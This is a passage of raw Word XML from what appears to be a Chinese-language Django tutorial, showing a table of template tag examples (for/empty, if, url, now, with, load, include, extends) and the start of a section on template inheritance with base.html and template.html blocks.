      <w:tr w:rsidR="00995934" w14:paraId="331D90DD"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19B4140" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% for .. empty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9936496" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>&lt;ul&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5384FE20" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% for athlete in athlete_list %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="53280F37" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;li&gt;{{ athlete.name }}&lt;/li&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="202E3E54" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% empty %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5FB184E8" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;li&gt;Sorry, no athletes。&lt;/li&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D7D94B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endfor %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C22EE53" w14:textId="3844ABBF" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="A9B7C6"/>
                <w:sz w:val="9"/>
                <w:szCs w:val="9"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>&lt;/ul&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="1F995C06"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04B364B" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% if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D2C738D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% if title != "python" %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38D561B5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">  Not python.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E18BEA6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endif %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0B9A0039" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00D8288D" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="67877BA2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% if "hello" in greetings %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0F0865AC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> Say hello</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="306EA414" w14:textId="539ED2C3" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endif %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="12B306E6"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96C13F7" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% url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246D701" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="A9B7C6"/>
                <w:sz w:val="9"/>
                <w:szCs w:val="9"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% url 'blog:article_detail' article.id %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="7F007CD0"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91C6E9B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% now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2CC3455" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% now "jS F Y H:i" %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="5315E69D"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0C132E5" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% with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CA56A60" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% with total=business.employees.count %}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B96EF09" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">    {{ total }} employee{{ total|pluralize }}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1ECA546F" w14:textId="40EE9355" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="A9B7C6"/>
                <w:sz w:val="9"/>
                <w:szCs w:val="9"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% endwith %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="5BB33747"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A3CE909" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% load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F1187C5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t># load tags and filters</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DC4A322" w14:textId="085CE6DE" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="A9B7C6"/>
                <w:sz w:val="9"/>
                <w:szCs w:val="9"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>{% load sometags library %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="444937AD"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55C762A" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% include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72DD4CB" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% include "header.html" %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="077BFB13" w14:textId="77777777" w:rsidTr="00995934">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="75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7E9D013" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% extends %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="498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FE035C7" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="0047302B" w:rsidRDefault="00995934" w:rsidP="0047302B">
            <w:pPr>
              <w:wordWrap w:val="0"/>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0047302B">
              <w:rPr>
                <w:rFonts w:hint="eastAsia"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>{% extends "base.html" %}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3A5BAB0B" w14:textId="4A632074" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69BDA61A" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板的继承</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B9A1CDF" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django支持模板的继承。你需要使用extends标签。在下面经典模板继承案例中，template.html中的content模块，会替换掉base.html中的content模块。同时template.html继承了base.html的sidebar和footer模块。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26899598" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># base.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406C30F1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block sidebar %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03EBA4C6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A56DE1A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6E8D6B19" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73B5091D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382D316A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FDEA6B9" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block footer %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F07DA83" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A7E41A5" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F4828BD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># template.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74FA0B14" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% extends "base.html" %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78148982" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70792D64" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">        {{ some code }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5252604A" w14:textId="46EC40A7" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D44E973" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="17BCB034" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
